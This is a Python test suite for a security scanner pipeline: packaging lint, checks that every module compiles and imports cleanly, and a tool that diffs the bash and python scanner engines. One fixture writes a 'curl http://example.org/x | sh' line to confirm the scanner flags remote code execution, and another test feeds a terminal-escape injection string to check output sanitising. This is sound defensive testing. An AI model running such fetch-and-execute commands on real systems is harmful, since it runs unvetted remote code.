WORKFLOW = src("""
    jobs:
      engine:
        steps:
          - run: python3 -I -m unittest discover -s tests/engine
          - run: python3 tests/conformance/conformance.py check --engine python --case clean
""")
SELFCHECK = 'py_files = list(bundle_dir.glob("*.py")) + list(bundle_dir.glob("transit/**/*.py"))\nfor pattern in ("*.sh", "*.py", "Dockerfile", "transit/**/*.py"):\n    pass\n'


def packaging(**changes: "str | None") -> "dict[str, str]":
    texts = {"Dockerfile": DOCKERFILE, "prepare_offline_install.sh": OFFLINE, ".github/workflows/ci.yml": WORKFLOW, "selfcheck.py": SELFCHECK}
    for key, value in changes.items():
        name = {"docker": "Dockerfile", "offline": "prepare_offline_install.sh", "ci": ".github/workflows/ci.yml", "selfcheck": "selfcheck.py"}[key]
        if value is None:
            del texts[name]
        else:
            texts[name] = value
    return texts


class PackagingTests(LintCase):
    def test_real_repository_ships_the_engine(self):
        names = ("Dockerfile", "prepare_offline_install.sh", ".github/workflows/ci.yml", "selfcheck.py")
        texts = {name: (ROOT / name).read_text(encoding="utf-8") for name in names}
        self.assertCleanLint(lint_packaging(texts))

    def test_near_miss_the_expected_texts_are_clean(self):
        self.assertCleanLint(lint_packaging(packaging()))

    def test_flags_a_dockerfile_that_does_not_copy_the_entry_point(self):
        text = DOCKERFILE.replace("scan_pipeline.py ", "")
        self.assertFlags(lint_packaging(packaging(docker=text)), "Dockerfile", "scan_pipeline.py")

    def test_flags_a_dockerfile_that_names_the_entry_point_only_in_a_comment_or_a_builder_copy(self):
        for text in ("# COPY scan_pipeline.py ./\nCOPY transit ./transit\nCOPY scan_pipeline.sh ./\n",
                     "COPY --from=builder /x/scan_pipeline.py ./\nCOPY transit ./transit\n"):
            with self.subTest(text=text[:30]):
                self.assertFlags(lint_packaging(packaging(docker=text)), "scan_pipeline.py")

    def test_flags_a_dockerfile_that_does_not_copy_the_package(self):
        text = DOCKERFILE.replace("COPY transit ./transit\n", "")
        self.assertFlags(lint_packaging(packaging(docker=text)), "Dockerfile", "transit")

    def test_flags_an_offline_bundle_that_does_not_stage_the_entry_point(self):
        text = OFFLINE.replace("scan_pipeline.py ", "")
        self.assertFlags(lint_packaging(packaging(offline=text)), "prepare_offline_install.sh", "scan_pipeline.py")

    def test_flags_an_offline_bundle_that_names_it_only_in_a_comment(self):
        text = OFFLINE.replace("scan_pipeline.py ", "").replace("for f in", "# scan_pipeline.py\nfor f in")
        self.assertFlags(lint_packaging(packaging(offline=text)), "scan_pipeline.py")

    def test_flags_an_offline_bundle_that_does_not_copy_the_package(self):
        text = OFFLINE.replace('cp -r transit "${BUNDLE}/pipeline/"', "true")
        self.assertFlags(lint_packaging(packaging(offline=text)), "prepare_offline_install.sh", "transit")

    def test_flags_a_workflow_that_does_not_run_the_engine_tests(self):
        text = WORKFLOW.replace("python3 -I -m unittest discover -s tests/engine", "python3 -m unittest")
        self.assertFlags(lint_packaging(packaging(ci=text)), "ci.yml", "unittest discover -s tests/engine")

    def test_flags_a_workflow_that_does_not_run_the_python_conformance_check(self):
        text = WORKFLOW.replace("--engine python", "--engine bash")
        self.assertFlags(lint_packaging(packaging(ci=text)), "ci.yml", "--engine python")

    def test_flags_a_workflow_that_has_the_commands_only_in_comments(self):
        text = "# python3 -I -m unittest discover -s tests/engine\n# conformance.py check --engine python\n"
        self.assertFlags(lint_packaging(packaging(ci=text)), "ci.yml")

    def test_flags_a_manifest_that_no_longer_globs_the_engine(self):
        self.assertFlags(lint_packaging(packaging(selfcheck='py_files = list(bundle_dir.glob("*.py"))\n')), "selfcheck.py", "transit")
        self.assertFlags(lint_packaging(packaging(selfcheck='x = glob("transit/**/*.py")\n')), "selfcheck.py", "*.py")

    def test_flags_a_missing_file(self):
        for key in ("docker", "offline", "ci", "selfcheck"):
            with self.subTest(key=key):
                self.assertFlags(lint_packaging(packaging(**{key: None})), "missing")


# ═══════════════════════════════════════════════════════════════════════════════════════════════
# 7. every interpreter on the host: compile with warnings as errors (F6), import every module (F10)
# ═══════════════════════════════════════════════════════════════════════════════════════════════
COMPILE_CHILD = r'''
import json, sys, warnings
bad = []
for path in sys.argv[1:]:
    with open(path, "rb") as handle:
        data = handle.read()
    with warnings.catch_warnings():
        warnings.simplefilter("error")
        try:
            compile(data, path, "exec", dont_inherit=True)
        except BaseException as exc:
            bad.append("%s: %s: %s" % (path, type(exc).__name__, str(exc)[:200]))
sys.stdout.write(json.dumps(bad))
'''

IMPORT_CHILD = r'''
import contextlib, importlib, io, json, os, signal, sys, warnings
root, work, names_json, helpers_json = sys.argv[1:5]
names = json.loads(names_json)
helpers = json.loads(helpers_json)
sys.path.insert(0, root)
os.chdir(work)
alarm_before = signal.getsignal(signal.SIGALRM)
timer_before = signal.getitimer(signal.ITIMER_REAL)
files_before = set(os.listdir("."))
out, err = io.StringIO(), io.StringIO()
problems = []
with warnings.catch_warnings(record=True) as caught:
    warnings.simplefilter("always")
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
        for name in names:
            try:
                importlib.import_module(name)
            except BaseException as exc:
                problems.append("%s raised %s: %s" % (name, type(exc).__name__, str(exc)[:160]))
report = {
    "problems": problems, "stdout": out.getvalue()[:200], "stderr": err.getvalue()[:200],
    "warnings": ["%s: %s (%s:%s)" % (w.category.__name__, str(w.message)[:120], os.path.basename(w.filename), w.lineno) for w in caught],
    "alarm_changed": signal.getsignal(signal.SIGALRM) != alarm_before,
    "timer_changed": signal.getitimer(signal.ITIMER_REAL) != timer_before,
    "files_created": sorted(set(os.listdir(".")) - files_before),
    "helpers_imported": sorted(h for h in helpers if h in sys.modules),
    "rules": [], "rulesets": [],
}
try:
    from transit import rules, rx
    report["rules"] = [[r.id, r.pattern, r.mode, r.excl] for r in rx.registered()]
    seen = set()
    def visit(value, depth):
        if isinstance(value, rules.RuleSet):
            if id(value) not in seen:
                seen.add(id(value))
                for spec in value.rules:
                    report["rulesets"].append([value.name, spec.id, spec.outcome, spec.message])
        elif depth < 3 and isinstance(value, (tuple, list, frozenset, set)):
            for item in value:
                visit(item, depth + 1)
        elif depth < 3 and isinstance(value, dict):
            for item in list(value.values()):
                visit(item, depth + 1)
    for name in names:
        module = sys.modules.get(name)
        if module is not None:
            for value in list(vars(module).values()):
                visit(value, 0)
except BaseException as exc:
    report["problems"].append("collecting the rules raised %s: %s" % (type(exc).__name__, str(exc)[:160]))
sys.stdout.write(json.dumps(report))
'''


@functools.lru_cache(maxsize=None)
def interpreters() -> "tuple[tuple[str, str], ...]":
    """``(version, executable)`` of this interpreter and of every ``python3.10`` to ``python3.14`` on the PATH, one per version, oldest first."""
    found: "dict[str, str]" = {}
    for exe in [sys.executable] + [shutil.which("python3.%d" % minor) or "" for minor in range(10, 15)]:
        if not exe:
            continue
        try:
            done = subprocess.run([exe, "-I", "-c", "import sys; print('%d.%d' % sys.version_info[:2])"], capture_output=True, text=True, timeout=60)
        except (OSError, subprocess.SubprocessError):
            continue
        version = done.stdout.strip()
        if done.returncode == 0 and version and version not in found:
            found[version] = exe
    return tuple(sorted(found.items(), key=lambda item: tuple(int(x) for x in item[0].split("."))))


def run_child(exe: str, script: str, *args: str, timeout: int = 300) -> str:
    """``exe -I -B -c script args``, with the bytecode cache pointed at an empty directory so every file is compiled (and every warning
    is seen) and none is written next to the sources."""
    with tempfile.TemporaryDirectory(prefix="lint_pyc_") as cache:
        done = subprocess.run([exe, "-I", "-B", "-X", "pycache_prefix=" + cache, "-c", script, *args], capture_output=True, text=True,
                              timeout=timeout)
    if done.returncode != 0:
        raise AssertionError("the child under %s exited %d:\n%s" % (exe, done.returncode, (done.stderr or done.stdout)[-1500:]))
    return done.stdout


def python_files_to_compile() -> "list[str]":
    sources = {**load_sources(), **load_test_sources()}
    return [str(ROOT / rel) for rel in sorted(sources)]


def import_names() -> "list[str]":
    """Every engine module (``scan_pipeline`` and ``transit.**``, the helper programs excluded) by its dotted name."""
    return sorted({module_name(rel) for rel in load_sources() if is_engine(rel)})


@functools.lru_cache(maxsize=None)
def import_report(exe: str) -> "dict[str, object]":
    work = tempfile.mkdtemp(prefix="lint_import_")
    try:
        text = run_child(exe, IMPORT_CHILD, str(ROOT), work, json.dumps(import_names()), json.dumps(sorted(HELPER_MODULES)))
    finally:
        shutil.rmtree(work, ignore_errors=True)
    return json.loads(text)


class InterpreterTests(unittest.TestCase):
    def test_the_host_has_at_least_the_running_interpreter(self):
        versions = [version for version, _ in interpreters()]
        self.assertIn("%d.%d" % sys.version_info[:2], versions)

    def test_every_file_compiles_with_warnings_as_errors(self):
        """F6. Python 3.12 turns an invalid escape sequence (``\\B`` in a non-raw docstring) into a SyntaxWarning on every compile without a
        cached ``.pyc``: a read-only install, a fresh container, a zipapp. ``transit/rx.py`` had one until open question 1 was settled."""
        paths = python_files_to_compile()
        self.assertGreater(len(paths), 20)
        for version, exe in interpreters():
            with self.subTest(python=version):
                bad = json.loads(run_child(exe, COMPILE_CHILD, *paths))
                self.assertEqual([], bad, "compile() with warnings as errors failed under Python %s" % version)

    def test_every_engine_module_imports_cleanly(self):
        """F10: no output, no warning, no change of the SIGALRM handler or the real-time timer, no file created, no helper program imported
        (``transit.containers.pdf`` would end the run with status 0), and no import error; discovery runs in ``load_registry`` and
        ``load_wrappers``, never at import."""
        self.assertIn("transit.scanners", import_names())
        for version, exe in interpreters():
            with self.subTest(python=version):
                report = import_report(exe)
                self.assertEqual([], report["problems"])
                self.assertEqual("", report["stdout"])
                self.assertEqual("", report["stderr"])
                self.assertEqual([], report["warnings"])
                self.assertFalse(report["alarm_changed"], "an import changed the SIGALRM handler")
                self.assertFalse(report["timer_changed"], "an import armed the real-time timer")
                self.assertEqual([], report["files_created"])
                self.assertEqual([], report["helpers_imported"])

    def test_the_import_check_can_fail(self):
        """The child reports a module that raises, prints or exits: run it on a scratch package."""
        with tempfile.TemporaryDirectory(prefix="lint_probe_") as scratch:
            root = Path(scratch) / "root"
            (root / "transit").mkdir(parents=True)
            (root / "transit" / "__init__.py").write_text("", encoding="utf-8")
            (root / "transit" / "noisy.py").write_text("print('hello at import')\n", encoding="utf-8")
            (root / "transit" / "exits.py").write_text("raise SystemExit(0)\n", encoding="utf-8")
            (root / "transit" / "alarm.py").write_text("import signal\nsignal.signal(signal.SIGALRM, lambda *a: None)\n", encoding="utf-8")
            (root / "transit" / "writes.py").write_text("open('stray.txt', 'w').close()\n", encoding="utf-8")
            (root / "transit" / "warns.py").write_text("import warnings\nwarnings.warn('careful')\n", encoding="utf-8")
            (root / "transit" / "imports_helper.py").write_text("import transit.helperprog\n", encoding="utf-8")
            (root / "transit" / "helperprog.py").write_text("", encoding="utf-8")
            work = Path(scratch) / "work"
            work.mkdir()
            names = ["transit.noisy", "transit.exits", "transit.alarm", "transit.writes", "transit.warns", "transit.imports_helper"]
            text = run_child(sys.executable, IMPORT_CHILD, str(root), str(work), json.dumps(names), json.dumps(["transit.helperprog"]))
        report = json.loads(text)
        self.assertTrue(any("exits raised SystemExit" in p for p in report["problems"]), report["problems"])
        self.assertIn("hello at import", report["stdout"])
        self.assertTrue(report["alarm_changed"])
        self.assertEqual(["stray.txt"], report["files_created"])
        self.assertTrue(any("careful" in w for w in report["warnings"]), report["warnings"])
        self.assertEqual(["transit.helperprog"], report["helpers_imported"])

    def test_the_compile_check_can_fail(self):
        with tempfile.TemporaryDirectory(prefix="lint_probe_") as scratch:
            bad = Path(scratch) / "bad.py"
            bad.write_text('"""A docstring with \\B in it."""\nX = "\\d"\n', encoding="utf-8")
            good = Path(scratch) / "good.py"
            good.write_text('"""A raw docstring."""\nX = r"\\d"\n', encoding="utf-8")
            for version, exe in interpreters():
                with self.subTest(python=version):
                    found = json.loads(run_child(exe, COMPILE_CHILD, str(bad), str(good)))
                    self.assertEqual(1, len(found), found)
                    self.assertIn("bad.py", found[0])


# ═══════════════════════════════════════════════════════════════════════════════════════════════
# 8. tests/conformance/family_diff.py (the acceptance tool of every scanner package of Waves 2 and 3)
# ═══════════════════════════════════════════════════════════════════════════════════════════════
from tests.conformance import family_diff  # noqa: E402

FAKE_ENGINE = r'''
import json, os, sys
scan, reports, name = sys.argv[1:4]
plan = json.loads(PLAN)
if plan.get("crash"):
    sys.stderr.write("the fake engine crashed\n")
    sys.exit(1)
results = {os.path.join(scan, rel): {"status": status, "message": message} for rel, (status, message) in plan.get("rows", {}).items()}
if "global" in plan:
    results["__global__"] = {"status": "WARN", "message": plan["global"]}
findings = [{"file": os.path.join(scan, rel), "rule_id": rule} for rel, rules in plan.get("findings", {}).items() for rule in rules]
with open(os.path.join(reports, "report_scan_" + name + ".json"), "w", encoding="utf-8") as handle:
    json.dump({"file_results": results, "findings": findings, "source": {"directory": scan}}, handle)
print("FAIL" if any(s == "FAIL" for s, _ in plan.get("rows", {}).values()) else "PASS")
sys.exit(1)
'''


class FamilyDiffTests(unittest.TestCase):
    """``family_diff.py`` against fake engine programs (a script that writes the report the test says), against the real dispatch on the real
    fixtures, and once against the real bash engine."""

    def setUp(self):
        self.scratch = Path(tempfile.mkdtemp(prefix="lint_family_"))
        self.addCleanup(shutil.rmtree, str(self.scratch), True)
        self.fixtures = self.scratch / "fixtures"
        self.fixtures.mkdir()
        (self.fixtures / "a.sh").write_text("echo a\n", encoding="utf-8")
        (self.fixtures / "b.py").write_text("print(1)\n", encoding="utf-8")
        (self.fixtures / "sub").mkdir()
        (self.fixtures / "sub" / "c.sh").write_text("echo c\n", encoding="utf-8")

    def engine(self, name: str, plan: "dict[str, object]") -> "list[str]":
        script = self.scratch / (name + "_engine.py")
        script.write_text("PLAN = %r\n" % json.dumps(plan) + FAKE_ENGINE, encoding="utf-8")
        return [sys.executable, "-I", str(script)]

    def run_main(self, argv: "list[str]", bash: "dict[str, object]", python: "dict[str, object]") -> "tuple[int, str]":
        out = io.StringIO()
        status = family_diff.main(argv + ["--fixtures", str(self.fixtures)], out=out,
                                  engines={"bash": self.engine("bash", bash), "python": self.engine("python", python)})
        return status, out.getvalue()

    ROWS = {"a.sh": ["FAIL", "[FAIL] CWE-78:remote_code_execution_curl_pipe_bash | [WARN] shellcheck missing | "], "sub/c.sh": ["PASS", ""]}

    # --- routing, on the real fixtures and the real dispatch ----------------------------------------------------------------
    def test_routing_of_the_real_fixtures(self):
        rules = ROOT / "tests" / "fixtures" / "rules"
        expected = {
            "bat_admin.bat": {"batch"}, "bat_ps_cradle.cmd": {"batch"}, "case_upper.PY": {"python"}, "case_UPPER.JAR": {"jar"},
            "composer_evil/composer.json": {"manifest.package_json"}, "pkg_safe/package.json": {"manifest.package_json"},
            "req_safe/requirements.txt": {"manifest.requirements"}, "setup_evil/setup.py": {"setuppy"}, "Makefile": {"makefile"},
            "evil.mk": {"makefile"}, "CMakeLists.txt": {"cmake"}, "evil.cmake": {"cmake"}, "evil.html": {"html"}, "build.xml": {"xml"},
            "pom.xml": {"xml"}, "exec.ps1": {"powershell.text"}, "gradle_safe/build.gradle": {"gradle"},
            "gradle_kts_safe/build.gradle.kts": {"gradle"}, "benign_doc.pdf": {"pdf"}, "safe_shell.sh": {"shell"},
            "office_rtf_package.rtf": {"rtf"},
            # a file with no route goes to the unknown scanner, and to the scanner its shebang names
            "entrypoint": {"unknown", "python"}, "pgp_private.asc": {"unknown"}, "ps_shebang_pwsh": {"unknown", "powershell.text"},
            # a sniffed answer may be no, so the next scanner is reachable too
            "office_rt2_flat_opc.xml": {"xml", "ooxml"}, "office_rt2_rtf_noext": {"rtf", "unknown"},
        }
        for rel, ids in expected.items():
            with self.subTest(rel=rel):
                self.assertTrue((rules / rel).is_file(), "the fixture is gone: " + rel)
                self.assertEqual(ids, family_diff.routed_ids(rules, rel))

    def test_a_basename_route_works_in_a_subdirectory(self):
        """Fixtures keep their relative path (a basename route needs it): ``sub/setup.py`` is still ``setuppy``."""
        (self.fixtures / "sub" / "setup.py").write_text("x = 1\n", encoding="utf-8")
        self.assertEqual({"setuppy"}, family_diff.routed_ids(self.fixtures, "sub/setup.py"))

    def test_select_fixtures_keeps_only_what_is_routed_to_the_ids(self):
        chosen = family_diff.select_fixtures([self.fixtures], ["shell"])
        self.assertEqual(["a.sh", "sub/c.sh"], [rel for _, rel in chosen])
        self.assertEqual(["b.py"], [rel for _, rel in family_diff.select_fixtures([self.fixtures], ["python"])])
        self.assertEqual([], family_diff.select_fixtures([self.fixtures], ["rust"]))

    def test_select_fixtures_skips_links_and_bytecode(self):
        (self.fixtures / "d.sh").symlink_to(self.fixtures / "a.sh")
        (self.fixtures / "__pycache__").mkdir()
        (self.fixtures / "__pycache__" / "e.sh").write_text("x\n", encoding="utf-8")
        (self.fixtures / "f.pyc").write_bytes(b"\0")
        self.assertEqual(["a.sh", "sub/c.sh"], [rel for _, rel in family_diff.select_fixtures([self.fixtures], ["shell"])])

    def test_two_fixture_directories_do_not_collide(self):
        other = self.scratch / "other"
        other.mkdir()
        (other / "a.sh").write_text("echo other\n", encoding="utf-8")
        selection = family_diff.select_fixtures([self.fixtures, other], ["shell"])
        target = self.scratch / "scan"
        origin = family_diff.build_scratch(selection, target)
        self.assertEqual({"fixtures/a.sh", "fixtures/sub/c.sh", "other/a.sh"}, set(origin))
        self.assertEqual("echo other\n", (target / "other" / "a.sh").read_text(encoding="utf-8"))

    def test_resolve_ids(self):
        known = {"python": "python", "manifest.package_json": "manifest", "manifest.requirements": "manifest", "shell": "shell"}
        self.assertEqual(["python"], family_diff.resolve_ids(["python", "python"], known))
        self.assertEqual(["manifest.package_json", "manifest.requirements"], family_diff.resolve_ids(["manifest"], known))
        self.assertEqual(["shell", "manifest.requirements"], family_diff.resolve_ids(["shell", "manifest.requirements"], known))
        for words in (["nonsense"], ["python", "nonsense"], []):
            with self.subTest(words=words):
                with self.assertRaises(family_diff.UsageError):
                    family_diff.resolve_ids(words, known)

    def test_the_real_registry_knows_every_family_of_the_deck(self):
        import build_pdf_filetypes
        known = family_diff.known_scanners()
        self.assertEqual({f["key"] for f in build_pdf_filetypes.FAMILIES} | {"unknown"}, set(known.values()))

    # --- comparing two engines ------------------------------------------------------------------------------------------------
    def test_identical_engines_have_no_difference(self):
        status, text = self.run_main(["shell"], {"rows": self.ROWS}, {"rows": self.ROWS})
        self.assertEqual(0, status, text)
        self.assertIn("2 file(s) compared, 0 difference(s)", text)
        self.assertNotIn("DIFF", text)

    def test_a_different_status_is_a_difference(self):
        python = {"rows": {"a.sh": ["PASS", ""], "sub/c.sh": ["PASS", ""]}}
        status, text = self.run_main(["shell"], {"rows": self.ROWS}, python)
        self.assertEqual(1, status)
        self.assertIn("DIFF fixtures/a.sh  status", text)
        self.assertRegex(text, r"bash\s+FAIL")
        self.assertRegex(text, r"python\s+PASS")
        self.assertIn("DIFF fixtures/a.sh  messages", text)
        self.assertNotIn("DIFF fixtures/sub/c.sh", text)

    def test_a_different_message_is_a_difference_even_with_the_same_status(self):
        python = {"rows": {"a.sh": ["FAIL", "[FAIL] CWE-78:another_rule | [WARN] shellcheck missing | "], "sub/c.sh": ["PASS", ""]}}
        status, text = self.run_main(["shell"], {"rows": self.ROWS}, python)
        self.assertEqual(1, status)
        self.assertIn("DIFF fixtures/a.sh  messages", text)
        self.assertNotIn("DIFF fixtures/a.sh  status", text)
        self.assertIn("CWE-78:another_rule", text)

    def test_the_order_of_the_messages_of_a_file_is_not_a_difference(self):
        python = {"rows": {"a.sh": ["FAIL", "[WARN] shellcheck missing | [FAIL] CWE-78:remote_code_execution_curl_pipe_bash | "],
                           "sub/c.sh": ["PASS", ""]}}
        status, text = self.run_main(["shell"], {"rows": self.ROWS}, python)
        self.assertEqual(0, status, text)

    def test_a_different_finding_rule_id_is_a_difference(self):
        bash = {"rows": self.ROWS, "findings": {"a.sh": ["CWE-78:remote_code_execution_curl_pipe_bash"]}}
        python = {"rows": self.ROWS, "findings": {"a.sh": ["CWE-78:something_else"]}}
        status, text = self.run_main(["shell"], bash, python)
        self.assertEqual(1, status)
        self.assertIn("DIFF fixtures/a.sh  rule ids", text)
        self.assertNotIn("DIFF fixtures/a.sh  status", text)
        self.assertNotIn("DIFF fixtures/a.sh  messages", text)

    def test_a_file_one_engine_never_reported_is_a_difference(self):
        python = {"rows": {"a.sh": self.ROWS["a.sh"]}}
        status, text = self.run_main(["shell"], {"rows": self.ROWS}, python)
        self.assertEqual(1, status)
        self.assertIn("DIFF fixtures/sub/c.sh  only in bash", text)

    def test_the_global_entry_is_not_compared(self):
        status, text = self.run_main(["shell"], {"rows": self.ROWS, "global": "[WARN] gitleaks missing | "},
                                     {"rows": self.ROWS, "global": "[WARN] something else | "})
        self.assertEqual(0, status, text)

    def test_an_engine_that_writes_no_report_is_exit_status_2_and_named(self):
        status, text = self.run_main(["shell"], {"rows": self.ROWS}, {"crash": True})
        self.assertEqual(2, status)
        self.assertIn("ENGINE python produced no report", text)
        self.assertIn("the fake engine crashed", text)

    def test_one_engine_only_prints_its_per_file_results(self):
        status, text = self.run_main(["shell", "--engines", "bash"], {"rows": self.ROWS}, {"crash": True})
        self.assertEqual(0, status, text)
        self.assertIn("fixtures/a.sh", text)
        self.assertIn("CWE-78:remote_code_execution_curl_pipe_bash", text)
        self.assertIn("bash: 2 file(s) reported", text)

    def test_list_runs_no_engine(self):
        out = io.StringIO()
        status = family_diff.main(["--list", "shell", "--fixtures", str(self.fixtures)], out=out,
                                  engines={"bash": ["/nonexistent/engine"], "python": ["/nonexistent/engine"]})
        self.assertEqual(0, status)
        self.assertIn("a.sh", out.getvalue())
        self.assertIn("sub/c.sh", out.getvalue())
        self.assertNotIn("b.py", out.getvalue())

    def test_nothing_routed_is_not_a_failure_and_says_so(self):
        out = io.StringIO()
        status = family_diff.main(["rust", "--fixtures", str(self.fixtures)], out=out, engines={"bash": ["/x"], "python": ["/x"]})
        self.assertEqual(0, status)
        self.assertIn("nothing is routed", out.getvalue())

    def test_usage_errors_are_exit_status_2(self):
        for argv in (["nonsense"], [], ["shell", "--engines", "perl"], ["shell", "--fixtures", "/nonexistent/dir"], ["shell", "--env", "NOEQUALS"],
                     ["shell", "--no-such-option"]):
            with self.subTest(argv=argv):
                err = io.StringIO()
                with contextlib.redirect_stderr(err), contextlib.redirect_stdout(io.StringIO()):
                    self.assertEqual(2, family_diff.main(argv, out=io.StringIO()))

    def test_text_from_a_report_is_made_printable(self):
        hostile = {"rows": {"a.sh": ["FAIL", "[FAIL] x\x1b]0;pwned\x07‮ | "], "sub/c.sh": ["PASS", ""]}}
        status, text = self.run_main(["shell"], hostile, {"rows": self.ROWS})
        self.assertEqual(1, status)
        self.assertEqual([], [ch for ch in text if (ord(ch) < 32 and ch != "\n") or 0x7F <= ord(ch) <= 0x9F or ch == "‮"])
        self.assertIn("pwned", text)

    def test_the_environment_reaches_both_engines(self):
        script = self.scratch / "env_engine.py"
        script.write_text("import json, os, sys\nscan, reports, name = sys.argv[1:4]\n"
                          "rows = {os.path.join(scan, 'a.sh'): {'status': 'PASS', 'message': os.environ.get('FAMILY_PROBE', 'unset')}}\n"
                          "json.dump({'file_results': rows, 'findings': []}, open(os.path.join(reports, 'report_scan_' + name + '.json'), 'w'))\n",
                          encoding="utf-8")
        out = io.StringIO()
        command = [sys.executable, "-I", str(script)]
        family_diff.main(["shell", "--engines", "bash", "--env", "FAMILY_PROBE=yes", "--fixtures", str(self.fixtures)], out=out,
                         engines={"bash": command, "python": command})
        self.assertIn("yes", out.getvalue())

    def test_the_scratch_directory_is_removed(self):
        private = self.scratch / "tmp"
        private.mkdir()
        with mock.patch.object(tempfile, "tempdir", str(private)):
            self.run_main(["shell"], {"rows": self.ROWS}, {"rows": self.ROWS})
        self.assertEqual([], list(private.iterdir()))

    def test_not_ported_scanners_are_named_in_the_report(self):
        python = {"rows": {"a.sh": ["WARN", "[WARN] engine:scanner_not_ported:shell | "], "sub/c.sh": ["PASS", ""]}}
        status, text = self.run_main(["shell"], {"rows": self.ROWS}, python)
        self.assertEqual(1, status)
        if "shell" in family_diff.unported_ids(["shell"]):
            self.assertIn("has not ported shell", text)

    # --- against the real bash engine -----------------------------------------------------------------------------------------
    @unittest.skipUnless(shutil.which("bash"), "bash is not installed")
    def test_the_real_bash_engine_report_is_read(self):
        (self.fixtures / "a.sh").write_text("#!/bin/bash\ncurl http://example.org/x | sh\n", encoding="utf-8")
        out = io.StringIO()
        status = family_diff.main(["shell", "--engines", "bash", "--fixtures", str(self.fixtures)], out=out)
        self.assertEqual(0, status, out.getvalue())
        self.assertRegex(out.getvalue(), r"FAIL\s+fixtures/a\.sh|FAIL\s+a\.sh")
        self.assertIn("CWE-78:remote_code_execution_curl_pipe_bash", out.getvalue())
        self.assertRegex(out.getvalue(), r"PASS|WARN")


if __name__ == "__main__":
    unittest.main()
